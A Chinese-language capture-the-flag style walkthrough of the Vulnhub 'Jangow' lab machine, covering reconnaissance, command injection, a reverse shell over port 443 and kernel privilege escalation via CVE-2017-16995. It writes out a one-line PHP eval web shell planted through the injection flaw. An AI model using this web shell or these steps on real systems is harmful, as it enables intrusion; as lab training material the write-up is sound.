---

title: Vulnhub--Jangow
categories: [渗透靶场, Vulnhub]

---

## 渗透复现

1. Web站点存在传参点并且存在命令执行漏洞，URL直接上马
2. 尝试反弹shell发现端口限制，脚本探测开放端口，443端口成功反弹shell
3. 程序无法提权情况下，LinPEAs脚本检测内核漏洞
4. 利用内核版本漏洞成功提权

## 知识扩展

1. 传参点利用命令执行漏洞进行URL上马
2. 端口限制的情况下，脚本探测开放端口

## 靶机地址

https://www.vulnhub.com/entry/jangow-101,754/

## 主机发现

（1）攻击机

```py
192.168.88.128	
```

（2）目标靶机

```py
192.168.88.133
```

## 信息收集

### 端口扫描

![image-20240827235908348](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272359463.png)

### 端口访问

![image-20240827235915515](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272359594.png)

### 目录扫描

```python
http://192.168.88.133/
http://192.168.88.133/site/
```

![image-20240827235922137](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408272359250.png)

![image-20240828000005059](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280000183.png)

### 目录爆破

![image-20240828000013330](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280000484.png)

### 目录访问

（1）/.backup文件，泄露数据库账号密码

![image-20240828000021686](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280000818.png)

（2）/site

![image-20240828000030527](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280000648.png)

（3）/site/assets/

![image-20240828000041515](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280000613.png)

（4）/site/js/

![image-20240828000057526](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280000638.png)

（5）功能点尝试，buscar页面存在传参点

![image-20240828000104936](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280001065.png)

![image-20240828000113060](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280001145.png)

（6）尝试命令执行，回显，存在命令执行漏洞

![image-20240828000119435](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280001512.png)

## 实施攻击

（1）URL上马

```py
#通过echo写入shell.php文件
echo '<?php eval($_POST["123"]);' > shell.php
```

![image-20240828000131775](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280001854.png)

![image-20240828000148146](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280001248.png)

（2）蚁剑连接

![image-20240828000153971](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280001066.png)

（3）尝试反弹shell，发现shell弹不回来，原因可能是服务器存在端口限制

![image-20240828000201127](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280002211.png)

（4）脚本探测发现靶机只开放443端口（一般情况下，服务器进行端口限制都不会限制80端口和443端口）

![image-20240828000211632](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280002717.png)

## 提权

（1）信息收集

![image-20240828000222159](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280002295.png)

![image-20240828000234519](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280002643.png)

（2）前往home目录，进行信息收集

![image-20240828000241929](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280002022.png)

（3）在程序无法提权情况下，通过LinPEAs脚本检测是否存在内核漏洞

![image-20240828000254840](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280002947.png)

![image-20240828000310442](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280003566.png)

（4）采取CVE-2017-16995进行提权

```py
#漏洞利用EXP地址
https://www.exploit-db.com/exploits/45010
```

![image-20240828000339706](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280003817.png)

（5）运行脚本，提权成功

![image-20240828000348903](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408280003004.png)